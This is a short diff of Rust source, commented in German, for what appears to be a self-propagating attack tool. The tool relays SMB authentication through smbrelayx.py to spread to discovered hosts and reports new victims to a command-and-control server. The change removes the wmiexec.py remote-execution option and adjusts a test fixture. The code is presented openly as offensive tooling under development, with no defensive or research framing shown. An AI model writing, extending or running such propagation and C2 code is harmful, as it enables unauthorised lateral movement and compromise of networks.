@@ -77,9 +77,6 @@ struct Args {
     /// Pfad zu smbrelayx.py.
     #[arg(long, default_value = "smbrelayx.py")]
     relay_script: String,
-    /// Pfad zu wmiexec.py.
-    #[arg(long, default_value = "wmiexec.py")]
-    wmi_script: String,
     /// Pfad zum selbstsignierten Server-Zertifikat (PEM).
     #[arg(long)]
     server_cert: String,
@@ -168,8 +165,7 @@ async fn main() {
         }
     };
 
-    let results =
-        propagate::run_propagation(&discovered, &args.relay_script, &args.wmi_script).await;
+    let results = propagate::run_propagation(&discovered, &args.relay_script).await;
 
     // 4. Neuentdeckte Hosts an den C2-Server melden.
     for h in &results.new_hosts {
@@ -320,7 +316,6 @@ mod tests {
             own_ip: "10.0.0.3".to_string(),
             hosts: None,
             relay_script: "smbrelayx.py".to_string(),
-            wmi_script: "wmiexec.py".to_string(),
             server_cert: "/tmp/server.pem".to_string(),
         }
     }
